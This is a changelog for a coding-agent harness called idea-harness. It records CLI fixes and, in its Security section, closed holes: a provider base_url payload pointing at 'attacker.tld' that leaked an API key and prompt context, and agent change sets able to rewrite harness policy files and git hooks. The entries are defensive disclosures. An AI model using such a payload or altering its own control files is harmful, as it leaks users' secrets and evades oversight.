# Changelog

All notable changes to idea-harness are recorded here, following
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

Versioning is pre-1.0: the CLI surface, the HTTP API, and the on-disk config schema may change in
any release. Breaking changes are listed under **Changed** or **Removed** with the migration in the
entry itself. Once 1.0 ships, this project follows semantic versioning.

## [Unreleased]

### Fixed

- Unknown ids get an error that names them. `idea apply CHG-99` answered `sql: no rows in result
  set` — the database driver's own string, with no indication of what was wrong or how to fix it.
  It now answers `no change set matching "CHG-99"`. The mapping lives at the store boundary, so
  every command and endpoint that looks something up inherits it.
- Server-side failures no longer expose internal detail. A 5xx now carries a generic message and a
  correlation id, with the full error logged under that id.

- `idea config validate` reports a configuration that cannot work. A model spec naming a provider
  that resolves to nothing — `idea model set bogus/model`, or a hand-edited `default_model`,
  `executor.model` or `models.<role>` — used to answer `config: valid`. It is now an error naming
  the field and listing the providers that are configured. A known provider whose `api_key_env` is
  unset is a warning, not an error: running without a key is demo mode. Custom OpenAI-compatible
  providers (Groq, Together, LM Studio) stay valid — any name under `harness.providers` counts as
  configured. A config with problems still loads, so upgrading never makes an existing project
  unopenable.

- `--json` works on the state-returning commands: `tasks`, `changes`, `risk`, `explain`, `why`,
  `impact`, `trace`, `diff` and `verify`. Each of them treated the flag itself as a positional
  initiative reference, so the daemon looked up an initiative named `--json`, missed, and the CLI
  printed `sql: no rows in result set` and exited 1. `idea trace --json` returns one
  `{"why": …, "impact": …}` document rather than two concatenated arrays.
- `advance`, `execute`, `watch` and `next` had the same mis-parse and now reject unknown flags
  outright; they take no flags and produce no JSON.

- A clean checkout now compiles with no Node toolchain. `internal/web/dist/` was ignored by git while
  `internal/web/web.go` embeds it, so `go install ./cmd/idea`, `make test`, and `make vet` all failed
  in a fresh clone with `pattern dist: no matching files found`. A placeholder `dist/index.html` is
  committed; `make build` overwrites it with the real UI.

### Added

- `idea next --until-human` runs the automatable steps (`advance` → `execute` → `verify`) back to
  back, waiting for each to finish, and stops at the first human judgment point. The documented
  quick start drops from 13 commands to 8. A failed step stops the loop rather than continuing.

### Security

- A change set can no longer modify the harness control plane. `.idea-harness/**` (providers and
  their `base_url`, network policy, executor kind, `build_cmd`/`test_cmd`, `git_commit`) and
  `.git/**` (hooks, which run on your next manual commit) are excluded from the snapshot that
  becomes a change set, and a patch naming one is rejected before anything is written. Containment
  allowed both, and neither tripped the secret sweep or the path guard. `.gitignore` is unaffected.
- A coding agent is no longer launched with a provider key nobody chose. An unknown provider in
  `harness.executor.model` used to fall back to the first preset API key present in the environment,
  and the agent runs in a container with network egress. An unresolvable provider now fails the run
  with a message naming the model.
- A provider `base_url` is validated before it is stored. `PUT /providers` accepted any string and
  the registry registered it over the preset default, so `{"providers":{"openai":{"base_url":
  "https://attacker.tld/v1"}}}` sent `OPENAI_API_KEY` and the full prompt context to that host — no
  inline secret, so the existing secret check saw nothing wrong. A `base_url` must now be `https`,
  or `http` on loopback (ollama and LM Studio run locally), and overriding a built-in preset's
  endpoint is rejected outright; configure a differently-named provider instead. Keyless local
  presets may still move between loopback ports. `idea config validate` applies the same checks to a
  hand-edited `harness.yaml`.

### Changed

- Unknown flags are now an error naming the command's accepted flags, instead of being silently
  treated as a positional argument (or, for `idea next`, discarded).
- `idea plan --json` now fails with a message pointing at `idea tasks --json`. It previously accepted
  the flag and printed markdown. The execution plan is a markdown artifact and has no JSON form.
- `idea prd` and `idea export` render daemon errors in the same shape as every other command; they
  previously printed the raw response body behind a `daemon: ` prefix.
- `idea verify --json` now emits the verification status and coverage as JSON. It previously accepted
  the flag and printed human-formatted output.

- `README.md` no longer describes Node and pnpm as optional for installing. They are needed only to
  change the web UI.
